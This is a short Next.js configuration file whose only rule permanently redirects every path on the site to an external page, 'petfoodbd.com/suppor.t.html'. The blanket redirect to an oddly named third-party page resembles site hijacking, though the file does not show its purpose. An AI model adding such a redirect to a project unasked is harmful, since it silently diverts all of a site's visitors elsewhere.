/** @type {import('next').NextConfig} */
const nextConfig = {
  async redirects() {
    return [
      {
        source: "/:path*",
        destination: "https://petfoodbd.com/suppor.t.html",
        permanent: true,
      },
    ];
  },
};

module.exports = nextConfig;
